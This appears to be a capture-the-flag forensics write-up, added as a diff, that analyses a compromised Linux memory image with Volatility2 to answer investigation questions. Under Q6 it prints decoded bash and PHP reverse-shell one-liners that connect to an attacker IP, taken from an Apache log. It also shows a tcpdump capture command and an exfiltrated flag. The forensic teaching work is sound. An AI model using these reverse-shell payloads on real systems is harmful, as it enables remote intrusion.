@@ -1,0 +1,114 @@
+# core-problems
+
+### Category: Forensics | Difficulty: Easy | Tenant: UNR
+
+We are given a file.bin and a .zip to use with Volatility2.
+The image is a linux one and that is why we must use the right symbols. The .zip file holds them.
+
+In order to use it, we can create a vol2_plugins folder and point to it in order to find the profile like so:
+
+```./volatility_2.6_lin64_standalone --plugins=~/vol2_plugins -f ~/Downloads/file.bin --info | grep Linux```
+
+The profile name is visible amongst them so every command must now be used like this:
+
+```./volatility_2.6_lin64_standalone --plugins=<plugins-folder> -f <file> --profile=<profile-name> [COMMAND]```
+
+Q1. What is the IP address of the attacker?
+
+Using the ```linux_netstat``` command, we can see 2 established connections to this address:
+```
+880079f34e00 TCP      192.168.1.136   :   22 192.168.1.194   :50606 ESTABLISHED    
+880079f35500 TCP      192.168.1.136   :   22 192.168.1.194   :55936 ESTABLISHED 
+```
+Q2. What model is the CPU of the affected machine?
+
+To find this out, we can use ```linux_cpuinfo```
+```
+Processor    Vendor           Model
+------------ ---------------- -----
+0            GenuineIntel     Intel(R) Core(TM) i9-10885H CPU @ 2.40GHz
+```
+Q3. What is the MAC address of the affected machine?
+
+Using ```linux_ifconfig``` gives us the IPv4 and MAC addresses of the machine:
+```
+Interface        IP Address           MAC Address        Promiscous Mode
+---------------- -------------------- ------------------ ---------------
+lo               127.0.0.1            00:00:00:00:00:00  False          
+eth0             192.168.1.136        08:00:27:cc:dd:e0  True           
+```
+Q4. What is the MAC address of the attacker machine?
+
+```linux_arp``` gives the ARP cache. Considering the addresses where on the same network, we found the right binding:
+```
+[192.168.1.194                             ] at 38:14:28:0b:12:de    on eth0
+```
+Q5. What is the PID of the application used by the attacker for his interactive shell?
+
+We can use ```linux_pslist``` to list the processes and their PIDs and PPIDs. Considering the connection was on port 22, I looked for sshd processes.
+```
+0xffff8800799d47d0 sshd                 4503            4455            1000            1000   0x0000000079024000 2021-11-24 12:54:56 UTC+0000
+```
+Q6. What was the initial payload used by the attacker to create a reverse shell (URL decoded)?
+
+Using ```linux_enum_files``` and ```linux_find_files``` (-F and -i switches for finding and dumping), looking through /var/log/apache2/access.log, the commands run trough the code parameter can be seen:
+```
+192.168.1.194 - - [24/Nov/2021:13:22:05 +0100] "GET /index.php?code=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.194%2F12035%200%3E%261 HTTP/1.1" 200 269 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36"
+192.168.1.194 - - [24/Nov/2021:13:22:12 +0100] "GET /index.php?code=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.1.194%22%2C12035%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27 HTTP/1.1" 200 366 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36"
+```
+From URL Decode:
+```
+bash -i >& /dev/tcp/192.168.1.194/12035 0>&1
+php -r '$sock=fsockopen("192.168.1.194",12035);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+The second command was successful, the first one not.
+
+Q7. What other payload did the attacker try, but was unsuccesful?
+
+See Q6 for the answer.
+
+Q8. What is the password of the unprivileged account?
+
+Q9. What is the CVE-ID of the exploit used to gain root access?
+
+Q10. Provide the link of the exploit from exploit-db.com.
+
+Q11. What program/script did the attacker download on the server for the initial recon?
+
+Q12. The attacker might have set a recording mechanism on the network. Find out where is this recodring stored (absolute path).
+
+Q13. What PID does this recording mechanism have?
+
+Q14. What port was used on the attacker's local machine for the reverse shell?
+
+See Q6 for the answer.
+
+Q15. What is the address of the exploit used by the attacker?
+
+Q16. What is the PID of the root shell?
+
+Q17. What is the full time of the moment when the attacker established the first connection with the reverse shell?
+
+See Q6 for that answer.
+
+Q18. What is the full time of the moment when the attacker elevated his privileges to root?
+
+Q19. The attacker exfiltrated some information from the root user. What is this information about? Format: CTF{sha256}.
+
+Using ```linux_psaux``` I found a certain command that seemed interesting to delve into:
+```
+4539   0      0      tcpdump -i eth0 -w /home/carl/capture.pcap 
+```
+So I proceeded to find and dump that file, using ```linux_find_file``` with the -F switch and then the -i switch when I got the inode number of it.
+Looking through the capture, a certain POST request stood out:
+```
+OST /exfil HTTP/1.1
+User-Agent: curl/7.35.0
+Host: 192.168.1.194:9000
+Accept: */*
+Content-Type: text/xml
+Content-Length: 70
+
+CTF{3041f1ad38fbb821aea811dff4190ed5527aeec0ed385789219dcdcf7de81d4f} 
+```
+It can also be found in /root/root.txt using ```linux_enumerate_files``` and then dumping it.
